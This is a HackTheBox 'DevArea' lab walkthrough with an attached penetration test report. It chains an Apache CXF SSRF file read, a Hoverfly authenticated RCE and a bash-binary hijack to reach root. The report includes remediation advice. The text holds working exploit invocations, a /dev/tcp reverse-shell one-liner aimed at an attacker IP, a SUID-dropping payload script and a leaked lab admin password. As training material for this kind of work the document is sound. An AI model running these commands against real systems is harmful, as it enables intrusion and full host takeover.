# DevArea

**Platform:** HackTheBox
**OS:** Linux
**Tags:** CVE-2022-46364, Apache CXF SSRF, File Read, Credential Disclosure, CVE-2025-54123, Hoverfly RCE, Bash Hijacking, SUID, SSRF, LFI, RCE, Privilege Escalation
**Date:** 2026-05-15

FTP anonymous access exposes an Apache CXF JAR deployed on Jetty. CVE-2022-46364 SSRF reads the Hoverfly systemd service file, leaking admin credentials. CVE-2025-54123 RCE on Hoverfly v1.11.3 lands a shell as dev_ryan. Root via bash binary hijacking: syswatch.sh runs with sudo and calls /usr/bin/bash internally. Replacing it with a SUID-dropping script gives a root shell.

## 1. Enumeration

Starting with a full-port service scan using Nmap. Six ports open: FTP on 21, SSH on 22, HTTP on 80, and three additional services on 8080, 8500, and 8888.

```bash
nmap -sC -sV -p- <TARGET_IP>

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp   open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://devarea.htb/
8080/tcp open  http    Jetty 9.4.27.v20200227
|_http-title: Error 404 Not Found
8500/tcp open  http    Golang net/http server (proxy)
8888/tcp open  http    Golang net/http server
|_http-title: Hoverfly Dashboard
```

Added `devarea.htb` to `/etc/hosts`. Port 8888 serves a Hoverfly Dashboard. The most immediate lead is anonymous FTP on port 21.

```bash
ftp anonymous@<TARGET_IP>
cd pub
mget *
```

The `pub` directory contains `employee-service.jar` and some supporting class files. Decompiling the JAR reveals it is an Apache CXF SOAP web service. The WSDL is exposed at `http://devarea.htb:8080/employeeservice?wsdl`, confirming the endpoint name and service structure. The version of CXF bundled in the JAR is pre-3.5.5, the range affected by CVE-2022-46364.

## 2. Foothold: CVE-2022-46364 (Apache CXF SSRF)

Apache CXF before version 3.5.5 / 3.4.10 is vulnerable to SSRF via MTOM `XOP:Include`. When a SOAP request includes a multipart MTOM body with an `XOP:Include` element pointing to an arbitrary `href` URL, the CXF server fetches that URL server-side and reflects the content back in the response, base64-encoded. No authentication required. CVSS 9.8 Critical.

This means we can make the server fetch any internal URL or local file path using the `file://` scheme, giving arbitrary file read on the server.

```bash
git clone https://github.com/kasem545/CVE-2022-46364-Poc
python3 CVE-2022-46364.py \
  -t http://devarea.htb:8080/employeeservice \
  -s file:///etc/passwd \
  -d devarea.htb
```

The response base64-decodes to the full `/etc/passwd`, confirming arbitrary file read. `dev_ryan` (uid 1001) has a login shell. Port 8888 runs Hoverfly as a service. The next target is the systemd service file, which typically stores the startup command including any credentials passed as flags.

```bash
python3 CVE-2022-46364.py \
  -t http://devarea.htb:8080/employeeservice \
  -s file:///etc/systemd/system/hoverfly.service \
  -d devarea.htb
```

The service file reveals the full startup command for Hoverfly, including credentials passed directly on the command line:

- ExecStart: `/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0`
- User: `dev_ryan` (Hoverfly runs as this user)

**Result:** Hoverfly admin credentials extracted from service file.

## 3. Shell: CVE-2025-54123 (Hoverfly RCE)

The Hoverfly Dashboard on port 8888 confirms version 1.11.3. This version is vulnerable to authenticated RCE via CVE-2025-54123. An attacker with valid credentials can inject arbitrary OS commands through the middleware configuration endpoint.

Confirming RCE with a simple `id` check:

```bash
./CVE-2025-54123.sh \
  -t http://<TARGET_IP>:8888 \
  -u admin -p O7IJ27MyyXiU \
  -c "id"

# uid=1001(dev_ryan) gid=1001(dev_ryan) groups=1001(dev_ryan)
```

RCE confirmed as `dev_ryan`. Setting up a listener and sending a reverse shell payload:

```bash
# Listener
nc -lvnp 4444

# Payload
./CVE-2025-54123.sh \
  -t http://<TARGET_IP>:8888 \
  -u admin -p O7IJ27MyyXiU \
  -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"
```

The shell connects back. Stabilise it with `python3 -c 'import pty; pty.spawn("/bin/bash")'` and `Ctrl+Z` then `stty raw -echo; fg`. The user flag is at `/home/dev_ryan/user.txt`.

**Result:** Interactive shell as `dev_ryan`. User flag at `/home/dev_ryan/user.txt`.

## 4. Privilege Escalation: Bash Binary Hijacking

Running LinPEAS surfaces two findings: a `syswatch-v1.zip` archive in `dev_ryan`'s home directory, and a sudo rule allowing `dev_ryan` to run `/opt/syswatch/syswatch.sh` as root without a password. Inspecting `syswatch.sh` shows the script internally calls `/usr/bin/bash` by absolute path. Checking permissions on that binary:

```bash
ls -la /usr/bin/bash
# -rwxrwxrwx 1 root root 1446024 /usr/bin/bash
```

`/usr/bin/bash` is world-writable. The plan: back up the real binary, replace it with a script that copies the original to `/tmp/rootbash` and sets the SUID bit on it, then trigger `syswatch.sh` via sudo - which calls our fake bash as root, dropping a SUID copy we can use for a root shell.

Back up the real binary and kill any active bash processes holding the file open:

```bash
# Back up the real bash binary
cp /usr/bin/bash /tmp/bash.bak

# Check for processes holding the file open
lsof /usr/bin/bash

# Kill any active bash processes
kill -9 <bash_pid>
```

Overwrite `/usr/bin/bash` with the SUID-dropping script. The shebang points to the backup so the script is a valid executable:

```bash
cat > /usr/bin/bash << 'EOF'
#!/tmp/bash.bak
cp /tmp/bash.bak /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF

chmod +x /usr/bin/bash
```

Trigger the script via sudo. When `syswatch.sh` calls `/usr/bin/bash` it executes our replacement as root - the script copies real bash to `/tmp/rootbash` with the SUID bit set:

```bash
sudo /opt/syswatch/syswatch.sh status

ls -la /tmp/rootbash
# -rwsr-xr-x 1 root root 1446024 /tmp/rootbash

/tmp/rootbash -p
# id
# uid=1001(dev_ryan) gid=1001(dev_ryan) euid=0(root)
```

The `-p` flag tells bash not to drop the SUID effective UID, giving a shell with `euid=0`. Root flag is at `/root/root.txt`.

**Result:** Root shell obtained.

## 5. Flags

- User: `redacted`
- Root: `redacted`

---

## Penetration Test Report

**Target:** devarea.htb
**Assessment type:** External network & web application assessment
**Assessment date:** 15 May 2026
**Environment:** HackTheBox laboratory assessment - Linux
**Prepared by:** Ledion Mujaj
**Reference:** 01 / 10

---

## 1. Executive Summary

### Assessment outcome

Testing against **devarea.htb** identified one critical unauthenticated vulnerability that chains into two high-severity findings and a high-severity local privilege escalation to root. Full host compromise was achieved from an unauthenticated starting position.
Anonymous FTP access exposed an Apache CXF service JAR. CVE-2022-46364 (CVSS 9.8) allowed unauthenticated server-side request forgery via the MTOM `XOP:Include` mechanism, enabling arbitrary file read on the server. The Hoverfly systemd service file was read, disclosing administrator credentials stored in plaintext on the command line.
With the recovered credentials, CVE-2025-54123 authenticated remote code execution on Hoverfly v1.11.3 produced an interactive shell as `dev_ryan` . Privilege escalation was achieved by replacing the world-writable `/usr/bin/bash` binary with a SUID-dropping script, then triggering the script by invoking a sudo-permitted administration script that called `/usr/bin/bash` internally.

### Impact

The complete compromise chain moved from no credentials to a root shell in four steps. An attacker in the same position could read all files on the host, modify system configuration, establish persistence, and use the host as a pivot point into any connected network.

### Priority recommendations

1. Apply the Apache CXF patch for CVE-2022-46364 and restrict SSRF-capable endpoints from making outbound requests.
2. Remove credentials from systemd service files and any process command lines; use a secrets manager or environment file with restricted permissions instead.
3. Apply the Hoverfly patch for CVE-2025-54123 and restrict the Hoverfly admin interface to authorised addresses.
4. Correct the permissions on `/usr/bin/bash` and audit all binaries called by privileged scripts for unauthorised write access.

### Conclusion

Each finding represents an independent control failure. F-01 enables credential recovery, but F-02 (plaintext storage) is the root cause of that exposure. F-03 and F-04 should be remediated regardless of F-01 and F-02 status.

## 2. Assessment Scope and Methodology

### 2.1 Target and observed services

| Asset | Description |
| --- | --- |
| devarea.htb | Ubuntu Linux; Apache httpd on 80, anonymous FTP on 21, SSH on 22, Jetty on 8080, Hoverfly on 8500 and 8888 |
| Port | Service | Observed detail |
| --- | --- | --- |
| 21/tcp | FTP | vsftpd 3.0.5; anonymous login permitted; pub/ contains employee-service.jar |
| 22/tcp | SSH | OpenSSH 9.6p1 Ubuntu |
| 80/tcp | HTTP | Apache httpd 2.4.58; redirects to devarea.htb |
| 8080/tcp | HTTP | Jetty 9.4.27; Apache CXF SOAP service |
| 8500/tcp | HTTP | Golang net/http; Hoverfly proxy |
| 8888/tcp | HTTP | Golang net/http; Hoverfly Dashboard |

```
nmap -sC -sV -p- <TARGET_IP>

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp   open  http    Apache httpd 2.4.58
8080/tcp open  http    Jetty 9.4.27.v20200227
8500/tcp open  http    Golang net/http server (proxy)
8888/tcp open  http    Golang net/http server
|_http-title: Hoverfly Dashboard
```

### 2.2 Approach

Testing started with full-port service discovery. Anonymous FTP was enumerated first, producing the CXF JAR. The JAR was decompiled to identify the CXF version and WSDL endpoint. SSRF was used to read internal files and recover credentials. Hoverfly was fingerprinted for CVE applicability and the RCE was confirmed before triggering the reverse shell. Post-exploitation enumeration with LinPEAS identified the sudo rule and the world-writable binary.

### 2.3 Severity classification

| Rating | Assessment criteria |
| --- | --- |
| Critical | Direct, readily exploitable compromise with exceptional impact or reach. |
| High | Execution of arbitrary code, significant unauthorised access or escalation to administrative privileges. |
| Medium | Meaningful exposure with constrained impact or substantial exploitation prerequisites. |
| Low | Limited direct impact; improvement to an existing security control. |

## 3. Results Overview

### 3.1 Findings summary

| Reference | Finding | Severity | Page |
| --- | --- | --- | --- |
| [F-01](#f-01) | CVE-2022-46364: Apache CXF unauthenticated SSRF / arbitrary file read | **Critical** | 6 |
| [F-02](#f-02) | Administrator credentials stored in plaintext in systemd service file | **High** | 7 |
| [F-03](#f-03) | CVE-2025-54123: Authenticated RCE on Hoverfly v1.11.3 | **High** | 8 |
| [F-04](#f-04) | World-writable `/usr/bin/bash` binary enables root privilege escalation | **High** | 9 |

### 3.2 Compromise sequence

| Stage | Action | Access obtained |
| --- | --- | --- |
| 01 | Downloaded employee-service.jar from anonymous FTP; decompiled to identify Apache CXF version vulnerable to CVE-2022-46364. | CXF WSDL endpoint confirmed |
| 02 | Exploited CVE-2022-46364 SSRF to read /etc/systemd/system/hoverfly.service; extracted admin credentials from ExecStart line. | Hoverfly admin credentials |
| 03 | Exploited CVE-2025-54123 with recovered credentials; obtained reverse shell. | dev_ryan shell |
| 04 | Replaced world-writable /usr/bin/bash with SUID-drop payload; triggered via sudo syswatch.sh rule. | Root shell (euid=0) |

### 3.3 Relationship between findings

F-01 is required to read the service file that contains the credentials described in F-02. F-03 depends on those credentials. F-04 is independent of F-01 through F-03: any user with shell access who discovers the world-writable binary and the sudo rule can escalate to root without involving Hoverfly or the SSRF path.

## 4.1 CVE-2022-46364: Apache CXF Unauthenticated SSRF

### F-01   MTOM XOP:Include server-side request forgery - CRITICAL

| Field | Assessment |
| --- | --- |
| Description | Apache CXF before 3.5.5 / 3.4.10 is vulnerable to SSRF via MTOM `XOP:Include` . A SOAP request containing a multipart MTOM body with an `XOP:Include` element pointing to an arbitrary `href` URI causes the CXF server to fetch that URI server-side and include the retrieved content in the response. The `file://` scheme is accepted, giving unauthenticated arbitrary file read on the server. CVSS 9.8 Critical. |
| Prerequisites | Network access to the CXF SOAP endpoint on port 8080. The JAR was publicly accessible via anonymous FTP, revealing the vulnerable version. |
| Impact | Arbitrary read of any file readable by the Jetty service account, including configuration files, credentials, SSH keys and system files. The Hoverfly systemd service file was read, disclosing administrator credentials (F-02). |
| Affected system | devarea.htb:8080 `http://devarea.htb:8080/employeeservice` |
| CVSS 3.1 | **9.8** (Critical) [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| CWE | [CWE-918](https://cwe.mitre.org/data/definitions/918.html) : Server-Side Request Forgery (SSRF) |

### Steps to reproduce

1. Download `employee-service.jar` from anonymous FTP: connect to `devarea.htb` and retrieve `pub/employee-service.jar` .
2. Decompile the JAR to identify the Apache CXF WSDL endpoint and confirm the vulnerable version.
3. Craft an MTOM SOAP request with an `XOP:Include href="file:///etc/passwd"` element and POST it to `http://devarea.htb:8080/employeeservice` .
4. Observe that the response contains the base64-encoded content of `/etc/passwd` , confirming unauthenticated arbitrary file read.

### Evidence

```
# Confirm arbitrary file read - /etc/passwd returned in response
python3 CVE-2022-46364.py \
  -t http://devarea.htb:8080/employeeservice \
  -s file:///etc/passwd \
  -d devarea.htb

# Response base64-decodes to /etc/passwd; dev_ryan (uid 1001) confirmed.

# Read Hoverfly systemd service file
python3 CVE-2022-46364.py \
  -t http://devarea.htb:8080/employeeservice \
  -s file:///etc/systemd/system/hoverfly.service \
  -d devarea.htb

# Response reveals full ExecStart command including credentials (see F-02).
```

Evidence E-01. Commands and service file content transcribed from assessment record. Credentials are documented under F-02. Public PoC: github.com/kasem545/CVE-2022-46364-Poc.

### Remediation

Upgrade Apache CXF to version 3.5.5 or 3.4.10 or later to obtain the patch for CVE-2022-46364. Restrict outbound requests from the application server using egress firewall rules and a deny-by-default outbound policy. Validate and restrict allowed URI schemes in any SOAP or XML processing pipeline.

### Verification

Confirm the patched CXF version is running. Attempt to trigger the MTOM XOP:Include SSRF against `file:///etc/passwd` and verify the request is rejected or sanitised. Confirm egress rules block unexpected outbound connections from the Jetty service.

## 4.2 Plaintext Credentials in Systemd Service File

### F-02   Hoverfly admin credentials in ExecStart - HIGH

| Field | Assessment |
| --- | --- |
| Description | The Hoverfly systemd unit file specifies the administrator username and password directly on the `ExecStart` command line as plaintext flags. Any process or user with read access to the unit file, or the ability to read process arguments, can recover the credentials without any further exploitation. |
| Prerequisites | Read access to `/etc/systemd/system/hoverfly.service` . Obtained via F-01 (SSRF) during testing, but the file may also be readable to local users depending on permissions. |
| Impact | Full administrator access to the Hoverfly application. The recovered credentials were used to authenticate to the CVE-2025-54123 exploit in F-03, producing a shell as `dev_ryan` . |
| Affected system | `/etc/systemd/system/hoverfly.service` devarea.htb:8888 (Hoverfly Dashboard) |
| CVSS 3.1 | **5.5** (Medium) [AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N](https://www.first.org/cvss/calculator/3.1#AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N) |
| CWE | [CWE-312](https://cwe.mitre.org/data/definitions/312.html) : Cleartext Storage of Sensitive Information |

### Steps to reproduce

1. Using the SSRF from F-01, request the Hoverfly service file: `python3 CVE-2022-46364.py -t http://devarea.htb:8080/employeeservice -s file:///etc/systemd/system/hoverfly.service -d devarea.htb` .
2. Decode the base64 response and locate the `ExecStart` line in the service unit file.
3. Observe that the administrator username and password are passed as plaintext flags on the command line.

### Evidence

```
# ExecStart line from hoverfly.service as returned by SSRF:
ExecStart=/opt/HoverFly/hoverfly -add -username admin \
  -password [redacted] -listen-on-host 0.0.0.0
User=dev_ryan

# Credentials confirmed by authenticating to Hoverfly Dashboard on port 8888.
# admin:[redacted] accepted.
```

Evidence E-02. ExecStart line transcribed from assessment record. Password shown as recovered from service file - it is not a system or SSH credential.

### Remediation

Remove credentials from all command-line arguments and process environment. Use a systemd `EnvironmentFile` with permissions restricted to root and the service account, or a secrets manager. Audit all service unit files and cron jobs for credentials stored in plaintext.

### Verification

Confirm that no credentials appear in the `ExecStart` line or any process-visible argument. Verify that the secrets file, if used, is not readable by unprivileged accounts and that the running Hoverfly process arguments do not include the password in `/proc/<pid>/cmdline` .

## 4.3 CVE-2025-54123: Authenticated RCE on Hoverfly

### F-03   Hoverfly middleware configuration command injection - HIGH

| Field | Assessment |
| --- | --- |
| Description | Hoverfly v1.11.3 is vulnerable to CVE-2025-54123: an authenticated attacker can inject arbitrary operating-system commands through the middleware configuration API endpoint. The Hoverfly Dashboard on port 8888 confirmed the vulnerable version. |
| Prerequisites | Valid Hoverfly administrator credentials. Supplied by F-02 during testing. |
| Impact | Arbitrary code execution as `dev_ryan` , the account under which Hoverfly runs. An interactive reverse shell was obtained, and the user flag was read from `/home/dev_ryan/user.txt` . |
| Affected system | devarea.htb:8888 Hoverfly v1.11.3 |
| CVSS 3.1 | **8.8** (High) [AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) |
| CWE | [CWE-94](https://cwe.mitre.org/data/definitions/94.html) : Improper Control of Generation of Code (Code Injection) |

### Steps to reproduce

1. Authenticate to the Hoverfly Dashboard at `http://devarea.htb:8888` using credentials recovered in F-02.
2. Confirm the Hoverfly version is v1.11.3 and matches the CVE-2025-54123 advisory.
3. Execute the exploit script: `./CVE-2025-54123.sh -t http://devarea.htb:8888 -u admin -p <password> -c "id"` and observe OS command output as `dev_ryan` .
4. Replace the `-c` payload with a reverse shell one-liner to obtain an interactive shell.

### Evidence

```
# RCE confirmation
./CVE-2025-54123.sh \
  -t http://<TARGET_IP>:8888 \
  -u admin -p [redacted] \
  -c "id"

# uid=1001(dev_ryan) gid=1001(dev_ryan) groups=1001(dev_ryan)

# Reverse shell
nc -lvnp 4444

./CVE-2025-54123.sh \
  -t http://<TARGET_IP>:8888 \
  -u admin -p [redacted] \
  -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"

# Shell connects
dev_ryan@devarea:~$ cat /home/dev_ryan/user.txt
[redacted]
```

Evidence E-03. Exploit command and RCE confirmation transcribed from assessment record. Attacker IP replaced. User flag redacted.

### Remediation

Upgrade Hoverfly to a version that resolves CVE-2025-54123. Restrict access to the Hoverfly Dashboard and API to authorised internal addresses. Apply the principle of least privilege to the Hoverfly service account; it should not run as a regular user account with a home directory and SSH access.

### Verification

Confirm the patched Hoverfly version is running. Verify that the middleware configuration endpoint no longer accepts command injection payloads. Confirm that the Dashboard is unreachable from external or untrusted network segments.

## 4.4 World-Writable System Binary Privilege Escalation

### F-04   /usr/bin/bash writable; sudo syswatch.sh escalation - HIGH

| Field | Assessment |
| --- | --- |
| Description | `/usr/bin/bash` has world-write permissions ( `-rwxrwxrwx` ). A sudo rule permits `dev_ryan` to run `/opt/syswatch/syswatch.sh` as root without a password. That script calls `/usr/bin/bash` by absolute path. Replacing the binary with an attacker-controlled script causes it to execute as root when `syswatch.sh` is invoked via sudo. The script was replaced with a SUID-copy payload, producing a root shell via `/tmp/rootbash -p` . |
| Prerequisites | Shell access as `dev_ryan` or any user with write permissions on `/usr/bin/bash` . |
| Impact | Full root privileges. Arbitrary code execution as root on the host. |
| Affected system | `/usr/bin/bash` (world-writable) `/opt/syswatch/syswatch.sh` (sudo NOPASSWD rule) |
| CVSS 3.1 | **7.8** (High) [AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) |
| CWE | [CWE-732](https://cwe.mitre.org/data/definitions/732.html) : Incorrect Permission Assignment for Critical Resource |

### Steps to reproduce

1. Check sudo permissions: `sudo -l` - observe that `/opt/syswatch/syswatch.sh` may be run as root without a password.
2. Confirm `/usr/bin/bash` is world-writable: `ls -la /usr/bin/bash` - expect `-rwxrwxrwx` .
3. Back up the binary ( `cp /usr/bin/bash /tmp/bash.bak` ) and replace it with a SUID-drop payload that copies bash to `/tmp/rootbash` with SUID bit set.
4. Trigger the payload: `sudo /opt/syswatch/syswatch.sh status` - the script calls `/usr/bin/bash` , executing the payload as root.
5. Run `/tmp/rootbash -p` and confirm root identity with `id` .

### Evidence

```
dev_ryan@devarea:~$ ls -la /usr/bin/bash
-rwxrwxrwx 1 root root 1446024 /usr/bin/bash

dev_ryan@devarea:~$ sudo -l
(root) NOPASSWD: /opt/syswatch/syswatch.sh

# Back up real binary
cp /usr/bin/bash /tmp/bash.bak

# Replace with SUID-drop payload
cat > /usr/bin/bash << 'EOF'
#!/tmp/bash.bak
cp /tmp/bash.bak /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF
chmod +x /usr/bin/bash

# Trigger via sudo - executes payload as root
sudo /opt/syswatch/syswatch.sh status

dev_ryan@devarea:~$ ls -la /tmp/rootbash
-rwsr-xr-x 1 root root 1446024 /tmp/rootbash

dev_ryan@devarea:~$ /tmp/rootbash -p
rootbash-5.1# id
uid=1001(dev_ryan) gid=1001(dev_ryan) euid=0(root)
```

Evidence E-04. Commands transcribed from assessment record. Root flag at /root/root.txt confirmed after privilege escalation.

### Remediation

Restore correct permissions on `/usr/bin/bash` ( `chmod 755` , owner root). Audit all binaries invoked by scripts running under privileged sudo rules and confirm none are writable by unprivileged users. Review the sudo rule for `syswatch.sh` and replace or remove it if the functionality can be achieved without elevated privileges.

### Verification

Confirm `ls -la /usr/bin/bash` shows permissions `-rwxr-xr-x` and the file is owned by root. Re-run the attack sequence from a `dev_ryan` context and confirm it fails. Verify the SUID binary at `/tmp/rootbash` is removed.

## 5. Remediation and Assessment Closeout

### 5.1 Corrective action plan

| Priority | Action | Reference |
| --- | --- | --- |
| Immediate | Restore correct permissions on /usr/bin/bash; remove or narrow the syswatch.sh sudo rule. | F-04 |
| Immediate | Remove Hoverfly admin credentials from ExecStart; use a restricted EnvironmentFile or secrets manager. | F-02 |
| High | Upgrade Apache CXF to patch CVE-2022-46364; restrict server-side outbound requests. | F-01 |
| High | Upgrade Hoverfly to patch CVE-2025-54123; restrict Dashboard access to authorised addresses. | F-03 |
No remediation retest is documented. Each finding includes verification criteria for closure.

### 5.2 Test artefacts

| Location | Purpose | Removal status |
| --- | --- | --- |
| `/tmp/bash.bak` | Backup of original /usr/bin/bash | Not verified |
| `/tmp/rootbash` | SUID copy of bash - privilege escalation evidence | Not verified |
| `/usr/bin/bash` | Modified binary - should be restored from backup | Not verified |

### 5.3 Evidence and limitations

Evidence blocks are sourced from the [DevArea assessment walkthrough](devarea-htb.html) . Flag values and cracked passwords are omitted from all evidence. The assessment did not verify all FTP contents or examine all running services.

### 5.4 Evidence index

| Reference | Supporting record |
| --- | --- |
| E-01 | Walkthrough section 2: CVE-2022-46364 SSRF file read |
| E-02 | Walkthrough section 2: Hoverfly service file credential disclosure |
| E-03 | Walkthrough section 3: CVE-2025-54123 RCE and reverse shell |
| E-04 | Walkthrough section 4: World-writable bash binary and sudo escalation |
